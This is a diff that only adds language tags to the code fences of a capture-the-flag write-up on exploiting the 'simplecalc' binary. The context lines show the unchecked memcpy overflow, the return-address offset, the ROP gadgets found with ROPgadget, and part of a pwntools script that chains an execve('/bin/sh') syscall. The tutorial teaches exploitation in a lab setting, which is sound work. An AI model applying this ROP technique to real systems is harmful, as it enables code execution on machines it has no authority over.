@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $    file simplecalc
 simplecalc: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped
 $    pwn checksec simplecalc
@@ -33,7 +33,7 @@ Shame on you... Bye
 
 So we can see that it is a 64 bit statically linked binary. The only binary mitigation it has is a Non-Executable stack so we can't push shellcode onto the stack and call it. When we run it, we see that it prompts us for a number of calculations. Then it allows us to do a number of calculations. Also it apparently won't let us calculate "small numbers". When we take a look at the main function in Ghidra (for me it was under a folder called `mai...`), we see this:
 
-```
+```c
 
 undefined8 main(void)
 
@@ -101,7 +101,7 @@ undefined8 main(void)
 
 So we can see that it starts of by prompting us for a number of calculations with the string `Expected number of calculations: `. It stores the number of calculations in `numberCalcs`. Then it checks to make sure the number of calculations is between `3` and `0x100` (If not it will print `Invalid number.` and just return). It will then malloc a size equal to `numberCalcs << 2` and store the pointer to it in `calculations`. This is the same operation as `numberCalcs * 4`. Just check out these calculations to see:
 
-```
+```pycon
 >>> 5 << 2
 20
 >>> 500 << 2
@@ -116,7 +116,7 @@ So we can see that it starts of by prompting us for a number of calculations wit
 
 Here it is essentially allocating `numberCalcs` number of integers, which each of them are four bytes big. Then it will enter into a while loop that will run once for each calculation we will specify (unless if we choose to exit early). Looking at the assembly code (since the decompilation looks a bit weird) for the multiplication section, we see that it is calling the `muls` function:
 
-```
+```nasm
         004014d3 83 f8 03        CMP        calculations,0x3
         004014d6 75 23           JNZ        LAB_004014fb
         004014d8 e8 cb fd        CALL       muls                                             undefined muls()
@@ -125,7 +125,7 @@ Here it is essentially allocating `numberCalcs` number of integers, which each o
 
 When we look at the `muls`function, we see that it checks to ensure that the two numbers have to be equal to or greater than `0x27`. Looking at it, we see that it pretty much just multiplies the two numbers together. Looking at the other three calculation operations, they seem pretty similar (except for subtraction, addition, and division).
 
-```
+```c
 void muls(void)
 
 {
@@ -148,7 +148,7 @@ void muls(void)
 
 However we can see that there is a bug that resides in the option to save and exit:
 
-```
+```c
               if (calcChoice == 5) {
                 memcpy(vulnBuf,calculations,(long)(numberCalcs << 2));
                 free(calculations);
@@ -158,7 +158,7 @@ However we can see that there is a bug that resides in the option to save and ex
 
 If we choose this option, it will use `memcpy` to copy over all of our calculations into `vulnBuf`. Thing is it doesn't do a size check, so if we have enough calculations we can overflow the buffer and overwrite the return address (there is no stack canary to prevent this). Let's find the offset from the start of our input to the return address. We start off by setting a breakpoint for right after the `memcpy` call, then seeing where our input lands (also `321456948` in hex is `0x13290b34`):
 
-```
+```gdb
 gef➤  b *0x40154a
 Breakpoint 1 at 0x40154a
 gef➤  r
@@ -253,7 +253,7 @@ Stack level 0, frame at 0x7fffffffdeb0:
 
 So we can see that the offset between the start of our input and the return address is `0x7fffffffdea8 - 0x7fffffffde60 = 0x48`, which will be `18` integers. Now for what to execute when we get the return address. Since the binary is statically linked and there is no PIE, we can just build a rop chain using the binary for gadgets and without an infoleak. The ROP Chain will essentially just make an execve syscall to `/bin/sh`. There are four registers that we need to control in order to make this syscall (checkout https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ for more details):
 
-```
+```text
 rax:  0x3b              Specify execve syscall
 rdi:  ptr to "/bin/sh"  Specify file to run
 rsi:  0x0               Specify no arguments
@@ -262,7 +262,7 @@ rdx:  0x0               Specify no environment variables
 
 To do this, we will need gadgets to control those four register. I typically like to go with gadgets like `pop rax; ret`, since it makes it simple. We will also need a gadget to write the string `/bin/sh` somewhere in memory that we know. Let's find our gadgets using ROPGadget (checkout https://github.com/JonathanSalwan/ROPgadget ):
 
-```
+```console
 $ python ROPgadget.py --binary simplecalc | grep "pop rax ; ret"
 0x000000000044db32 : add al, ch ; pop rax ; ret
 0x000000000040b032 : add al, ch ; pop rax ; retf 2
@@ -299,26 +299,26 @@ $ python ROPgadget.py --binary simplecalc | grep "pop rdx ; ret"
 
 So we can see the gadgets for controlling the four registers are at `0x44db34`, `0x401b73`, `0x401c87`, and `0x437a85`. Now we need a gadget that will write an eight byte value to a memory region. For this I would like to start my search by searching through the gadgets with `mov` in them:
 
-```
+```console
 $ python ROPgadget.py --binary simplecalc | grep "mov" | less
 ```
 
 after a bit of searching, we find this gadget:
 
-```
+```nasm
 0x000000000044526e : mov qword ptr [rax], rdx ; ret
 ```
 
 This gadget will move the four byte value from `rdx` to whatever memory is pointed to by `rax`. This is exactly what we need, and a bit convenient since we already have the gadgets for those two registers and this gadget doesn't do anything else that we need to worry about. The last gadget we need will be a `syscall` gadget:
 
-```
+```console
 $ python ROPgadget.py --binary simplecalc | grep ": syscall"
 0x0000000000400488 : syscall
 ```
 
 There are two more things we need to figure out. The first is where in memory we will write the string `/bin/sh`. Let's check the memory mappings while the binary is running:
 
-```
+```gdb
 gef➤  vmmap
 Start              End                Offset             Perm Path
 0x0000000000400000 0x00000000004c1000 0x0000000000000000 r-x /Hackery/pod/modules/bof_static/bkp16_simplecalc/simplecalc
@@ -359,7 +359,7 @@ We see that the memory region that begins at `0x6c0000` and ends at `0x6c3000` l
 
 The second thing we need to worry about deals with what we are overflowing on the stack.
 
-```
+```text
   void *calculations;
   undefined vulnBuf [40];
   int calcChoice;
@@ -369,14 +369,14 @@ The second thing we need to worry about deals with what we are overflowing on th
 
 We see that between `vulnBuf` and the bottom of the stack (where the return address resides) is the pointer `calculations`. This will get overwritten as part of the overflow. This is a problem since this address is freed prior to our code being executed:
 
-```
+```c
                 memcpy(vulnBuf,calculations,(long)(numberCalcs << 2));
                 free(calculations);
                 return 0;
 ```
 
 However looking at the source code for free tells us something extremely helpful in this instance (I found it here: https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#free ):
-```
+```c
 __libc_free (void *mem)
 {
   mstate ar_ptr;
@@ -396,7 +396,7 @@ We can see here that if the argument we pass to free is a null pointer (`0x0`) t
 
 With that, we have everything we need to make the exploit. In the comments, you can find the exact ROP chain I used as well as what each part does. Also I wrote some helper functions which will write the values I want using addition:
 
-```
+```python
 from pwn import *
 
 target = process('./simplecalc')
@@ -481,7 +481,7 @@ target.interactive()
 
 When we run the exploit:
 
-```
+```console
 $ python exploit.py
 [+] Starting local process './simplecalc': pid 15676
 [*] Switching to interactive mode
